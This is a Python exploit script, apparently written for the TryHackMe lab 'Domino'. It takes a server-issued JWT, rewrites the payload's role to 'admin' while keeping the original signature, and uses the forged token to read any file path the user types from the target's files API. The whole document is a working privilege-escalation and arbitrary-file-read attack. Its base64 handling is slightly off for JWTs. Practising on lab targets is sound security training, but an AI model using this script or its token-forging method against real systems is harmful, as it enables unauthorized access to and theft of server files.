#!/usr/bin/env python3

import argparse
import requests
import json
import base64

def get_auth():
    
    r = requests.get(token_uri, headers={"Cookie":cookie})
    r_json = r.json()
    token = r_json.get("token")

    return token

def build_jwt(orig_token): 
    
    jwt_parts = orig_token.split('.')
    
    encoded_payload = jwt_parts[1]
    decoded = base64.b64decode(encoded_payload).decode("utf-8")
    payload_json = json.loads(decoded)
    payload_json["role"] = "admin"
    
    modified = json.dumps(payload_json).encode("utf-8")
    evil_payload = base64.b64encode(modified).decode("utf-8")
    
    evil_jwt = jwt_parts[0] + "." + evil_payload + "." + jwt_parts[2]
    
    return evil_jwt

def read_file(token):
    
    while True:
        target_file = input("Path of file to read: ")
        r = requests.get(file_uri + "?name=" + target_file, headers={"Authorization": f"Bearer {token}"})
        
        try:
            r_json = r.json()
        except json.JSONDecodeError:
            print("Error: Could not parse server response")
            return

        if "content" in r_json:
            display_content = r_json["content"]
            print(f"\nFile {target_file} found! Reading contents...\n\n{display_content}")
        
        elif "error" in r_json:
            display_content = r_json["error"]
            print("\nError: " + display_content + "\n")
        
        else:
            return

parser = argparse.ArgumentParser(description="Built to exploit the JWT signature verification vulnerability in TryHackMe 'Domino'")
parser.add_argument("--target", dest='target', required=True, help="Target IP address or hostname (required)")
parser.add_argument("--cookie", dest='cookie_file', required=True, help="File containing cookie used to generate JWT (required)")
args = parser.parse_args()

with open(args.cookie_file, 'r') as file:
    raw_cookie = file.read()
cookie = raw_cookie.rstrip()

token_uri = "http://" + args.target + "/api/auth/token.php"
file_uri = "http://" + args.target + "/api/files.php"

orig_token = get_auth()

evil_token = build_jwt(orig_token)

read_file(evil_token)
